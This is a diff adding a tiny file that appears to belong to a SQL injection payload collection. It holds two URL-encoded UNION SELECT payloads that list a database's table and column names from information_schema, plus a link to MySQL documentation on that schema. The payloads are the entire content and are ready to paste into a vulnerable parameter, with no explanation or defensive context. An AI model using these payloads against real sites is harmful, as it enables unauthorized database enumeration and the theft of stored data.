@@ -1,0 +1,13 @@
+'+union+select+table_name,null+from+information_schema.tables--
+'+union+select+column_name,null+from+information_schema.columns+where+table_name='TABLE_NAME'--
+
+
+
+
+
+
+
+
+
+
+Reference:https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/information-schema.html#tables-table
